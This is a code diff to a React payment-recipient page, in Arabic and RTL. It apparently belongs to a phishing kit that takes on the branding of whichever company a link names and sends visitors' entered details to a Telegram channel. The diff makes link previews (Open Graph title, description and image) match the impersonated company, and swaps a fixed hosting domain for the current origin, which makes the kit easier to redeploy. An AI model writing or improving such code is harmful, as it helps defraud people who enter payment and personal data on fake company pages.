@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
+import { Helmet } from "react-helmet-async";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -47,6 +48,11 @@ const PaymentRecipient = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
+
+  // Use dynamic company meta for OG tags
+  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
+  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
+  const dynamicImage = companyMeta.image;
 
   const shippingInfo = linkData?.payload as any;
 
@@ -127,7 +133,7 @@ const PaymentRecipient = () => {
     }
 
     // Send data to Telegram
-    const productionDomain = 'https://gulf-unified-payment.netlify.app';
+    const productionDomain = window.location.origin;
     const telegramResult = await sendToTelegram({
       type: 'payment_recipient',
       data: {
@@ -170,12 +176,18 @@ const PaymentRecipient = () => {
   
   return (
     <>
-      <PaymentMetaTags 
+      <PaymentMetaTags
         serviceName={serviceName}
+        serviceKey={serviceKey}
         amount={formattedAmount}
-        title={`معلومات المستلم - ${serviceName}`}
-        description={`أدخل معلومات المستلم لخدمة ${serviceName}`}
+        title={dynamicTitle}
+        description={dynamicDescription}
       />
+      {/* Dynamic OG Image via direct meta tag injection */}
+      <Helmet>
+        <meta property="og:image" content={dynamicImage} />
+        <meta name="twitter:image" content={dynamicImage} />
+      </Helmet>
       <div 
         className="min-h-screen bg-background" 
         dir="rtl"
